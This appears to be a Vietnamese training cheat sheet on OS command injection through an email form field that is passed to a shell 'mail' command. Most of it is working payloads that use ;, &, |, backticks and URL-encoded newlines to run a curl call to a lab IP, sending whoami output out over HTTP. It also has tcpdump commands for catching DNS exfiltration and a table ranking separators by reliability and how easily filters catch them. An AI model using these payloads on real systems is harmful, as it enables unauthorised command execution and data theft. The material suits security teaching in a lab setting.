📌 CÁCH 1: Dùng ; (Semicolon) - KHUYẾN NGHỊ ✅

┌──────────────────────────────────────────────────────────────────┐
│ HTTP Exfiltration:                                               │
└──────────────────────────────────────────────────────────────────┘

email=test@a.com;curl http://192.168.11.21:8000/?d=`whoami`;x@x.com

# Command thực thi:
mail -s Feedback -r test@a.com;curl http://192.168.11.21:8000/?d=`whoami`;x@x.com admin@...
                                ↑                                   ↑
                            Command 1                           Command 2

# Flow:
1. mail -r test@a.com    → Execute (có thể success/fail)
2. ;                     → Command separator (chạy tiếp dù sao)
3. curl http://...       → Execute! Exfiltrate data
4. ;                     → Command separator
5. x@x.com admin@...     → Remainder (có thể fail, không quan trọng)

✅ ƯU ĐIỂM:
- Không cần dummy values a, b
- Syntax rõ ràng
- Chắc chắn execute

❌ NHƯỢC ĐIỂM:
- Dễ bị phát hiện trong log (nhiều command)


┌──────────────────────────────────────────────────────────────────┐
│ DNS Exfiltration:                                                │
└──────────────────────────────────────────────────────────────────┘

sudo tcpdump -i any -n port 53

📌 CÁCH 2: Dùng & (Background) ⚠️

┌──────────────────────────────────────────────────────────────────┐
│ Payload:                                                         │
└──────────────────────────────────────────────────────────────────┘

email=test@a.com&curl http://192.168.11.21:8000/?d=`whoami`&

# Command:
mail -s Feedback -r test@a.com&curl http://...&
                                ↑              ↑
                         Background job

⚠️ CHÚ Ý:
- Command chạy background
- Có thể không chờ output
- Phù hợp với OOB


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 CÁCH 3: Dùng | (Pipe) ❌ Không khuyến nghị

email=echo test|curl http://192.168.11.21:8000/?d=`whoami`

# Pipe output của lệnh trước vào lệnh sau
# Curl không nhận stdin → không hoạt động tốt

📌 CÁCH 4: Dùng Command Substitution `...` ✅

┌──────────────────────────────────────────────────────────────────┐
│ Inline execution:                                                │
└──────────────────────────────────────────────────────────────────┘

email=`curl http://192.168.11.21:8000/?d=\`whoami\``@test.com

# Command substitution executes TRƯỚC KHI pass vào mail
# Backtick lồng nhau cần escape

⚠️ Phức tạp với nested backticks


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 CÁCH 5: Newline Injection 🔥

email=test%0Acurl http://192.168.11.21:8000/?d=`whoami`

# %0A = newline (\n)
# Tạo command mới trên dòng mới

# Command:
mail -s Feedback -r test
curl http://192.168.11.21:8000/?d=`whoami`

✅ ƯU ĐIỂM:
- Clean separation
- Mỗi command trên 1 dòng

❌ NHƯỢC ĐIỂM:
- Có thể bị filter
- Phụ thuộc shell parsing

╔═══════════════════════════════════════════════════════════════╗
║ Option 1: Dùng nip.io (IP-based DNS)                         ║
╚═══════════════════════════════════════════════════════════════╝

sudo tcpdump -i any -n 'udp port 53 and host 192.168.11.19'

📊 SO SÁNH CÁC SEPARATOR:

┌──────────┬────────────┬─────────────┬──────────────┬───────────┐
│ Operator │ Ý nghĩa    │ Execute khi │ Use case     │ Khuyến nghị│
├──────────┼────────────┼─────────────┼──────────────┼───────────┤
│ ;        │ Sequential │ Luôn        │ Chắc chắn    │ ✅ Tốt    │
│ ||       │ OR         │ Fail trước  │ Fallback     │ ✅ Tốt    │
│ &&       │ AND        │ Success     │ Conditional  │ ⚠️ Cẩn thận│
│ &        │ Background │ Luôn        │ Async        │ ⚠️ OK     │
│ |        │ Pipe       │ Luôn        │ Data flow    │ ❌ Khó    │
│ `...`    │ Subshell   │ Trước       │ Nested exec  │ ⚠️ Phức tạp│
│ %0A      │ Newline    │ Mới dòng    │ Clean split  │ ⚠️ May filter│
└──────────┴────────────┴─────────────┴──────────────┴───────────┘

💡 TẠI SAO DÙNG `a||...||b` TRONG GUIDE?

1. ✅ Universal compatibility - hoạt động với mọi shell
2. ✅ Không bị filter dễ dàng
3. ✅ Logic rõ ràng cho học viên
4. ✅ Minh họa OR operator exploitation
5. ✅ Tránh syntax error với mail command
